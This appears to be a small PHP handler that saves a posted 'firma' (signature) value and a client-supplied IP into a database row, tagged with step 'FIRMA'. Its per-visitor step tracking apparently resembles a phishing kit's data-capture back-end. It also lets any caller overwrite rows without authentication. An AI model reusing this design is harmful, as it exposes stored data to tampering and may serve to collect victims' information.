<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $firma = $_POST['firma'];
    $ip  = $_POST['ip'];

    $data = [
        'firma'   => $firma,
        'ip'    => $ip,
        'step'  => 'FIRMA'
    ];

    $db->where ('ip', $ip);
    $db->update ('data', $data);

    $db->disconnect();

}

?>